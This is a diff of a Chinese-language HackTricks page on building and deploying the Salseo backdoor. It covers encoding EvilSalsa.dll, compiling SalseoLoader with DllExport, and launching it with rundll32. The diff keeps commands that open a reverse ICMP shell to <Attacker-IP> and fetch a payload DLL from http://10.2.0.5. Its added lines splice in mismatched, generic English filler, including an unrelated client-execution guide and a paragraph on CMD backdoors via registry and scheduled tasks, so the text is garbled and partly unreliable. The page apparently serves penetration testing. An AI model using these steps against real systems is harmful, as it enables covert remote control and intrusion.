@@ -30,7 +30,7 @@
 
 ## 准备后门
 
-首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**来进行编码：
+首先，你需要对**EvilSalsa.dll**进行编码。你可以使用python脚本**encrypterassembly.py**或者编译项目**EncrypterAssembly**：
 
 ### **Python**
 ```
@@ -123,11 +123,19 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 #### 执行客户端：
 
-```bash
-python client.py
-```
+To execute the client, you need to follow these steps:
 
-The client will establish a connection with the server and wait for commands.
+1. Make sure you have the client file downloaded and saved on your local machine.
+
+2. Open a terminal or command prompt.
+
+3. Navigate to the directory where the client file is located using the `cd` command.
+
+4. Once you are in the correct directory, run the client file by typing its name followed by the appropriate command. For example, if the client file is named `client.exe`, you would type `client.exe` and press Enter.
+
+5. The client will then execute and start running on your machine.
+
+Remember to exercise caution when executing any files, especially those obtained from untrusted sources. Always scan files for malware before running them.
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -139,55 +147,57 @@ SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 
 使用Visual Studio打开SalseoLoader项目。
 
-在主函数之前添加\[DllExport]。
+### 在主函数之前添加：\[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png>)
 
-为该项目安装DllExport。
+### 为该项目安装DllExport
 
-选择**工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
+#### **工具** --> **NuGet程序包管理器** --> **管理解决方案的NuGet程序包...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)
 
-在浏览选项卡中搜索DllExport程序包，并点击安装（接受弹出窗口）。
+#### **搜索DllExport包（使用浏览选项卡），然后点击安装（并接受弹出窗口）**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)
 
-在项目文件夹中会出现**DllExport.bat**和**DllExport_Configure.bat**文件。
+在项目文件夹中会出现以下文件：**DllExport.bat**和**DllExport\_Configure.bat**
 
-卸载DllExport。
+### **卸载** DllExport
 
-点击**卸载**（是的，这很奇怪，但请相信我，这是必要的）。
+点击**卸载**（是的，很奇怪，但相信我，这是必要的）
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
-退出Visual Studio并执行DllExport_Configure。
+### **退出Visual Studio并执行DllExport\_configure**
 
-只需退出Visual Studio，然后转到您的SalseoLoader文件夹并执行DllExport_Configure.bat。
+只需**退出**Visual Studio
 
-选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**。
+然后，转到**SalseoLoader文件夹**并**执行DllExport\_Configure.bat**
+
+选择**x64**（如果您将在x64系统中使用它，这是我的情况），选择**System.Runtime.InteropServices**（在**DllExport的命名空间**中）并点击**应用**
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1).png>)
 
-再次使用Visual Studio打开项目。
+### **再次使用Visual Studio打开项目**
 
-\[DllExport]不再标记为错误。
+**\[DllExport]**不再被标记为错误
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
-构建解决方案。
+### 构建解决方案
 
-选择**输出类型=类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型=类库）。
+选择**输出类型 = 类库**（项目 --> SalseoLoader属性 --> 应用程序 --> 输出类型 = 类库）
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标=x64）。
+选择**x64平台**（项目 --> SalseoLoader属性 --> 构建 --> 平台目标 = x64）
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-构建解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）。
+要**构建**解决方案：构建 --> 构建解决方案（在输出控制台中将显示新DLL的路径）
 
-测试生成的DLL
+### 测试生成的DLL
 
 将DLL复制并粘贴到要进行测试的位置。
 
@@ -214,11 +224,15 @@ rundll32.exe SalseoLoader.dll,main
 
 CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a text-based interface for executing commands and managing the system. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
 
-CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can exploit vulnerabilities, escalate privileges, and gain control over the target system.
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts on a target system. By gaining access to CMD, hackers can perform a wide range of activities, including reconnaissance, privilege escalation, and data exfiltration.
 
-To access CMD, you can open the Start menu, type "cmd" in the search bar, and press Enter. This will open the Command Prompt window, where you can start executing commands.
+To exploit CMD, hackers often use backdoors to gain persistent access to a compromised system. A backdoor is a hidden entry point that allows unauthorized access to a system. By installing a backdoor on a target system, hackers can maintain access even if the system is patched or the user's password is changed.
 
-It is important to note that CMD should only be used for legitimate purposes, such as system administration or troubleshooting. Using CMD for malicious activities is illegal and unethical.
+There are several methods to create a backdoor in CMD. One common technique is to modify the system's registry to execute a malicious script every time the system starts up. Another method is to create a scheduled task that runs a backdoor script at specific intervals.
+
+Once a backdoor is installed, hackers can use CMD to remotely control the compromised system. They can execute commands, upload and download files, and manipulate system settings. CMD provides a convenient interface for hackers to interact with the target system and carry out their malicious activities.
+
+To protect against CMD-based attacks, it is important to regularly update the operating system and security software. Additionally, monitoring network traffic and implementing strong access controls can help detect and prevent unauthorized access to CMD.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -229,12 +243,12 @@ rundll32.exe SalseoLoader.dll,main
 ```
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* 你在一家 **网络安全公司** 工作吗？想要在 HackTricks 中 **宣传你的公司** 吗？或者你想要获取 **PEASS 的最新版本或下载 HackTricks 的 PDF** 吗？请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
-* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
-* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或者 [**Telegram 群组**](https://t.me/peass) 或者 **关注** 我的 **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**
+* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
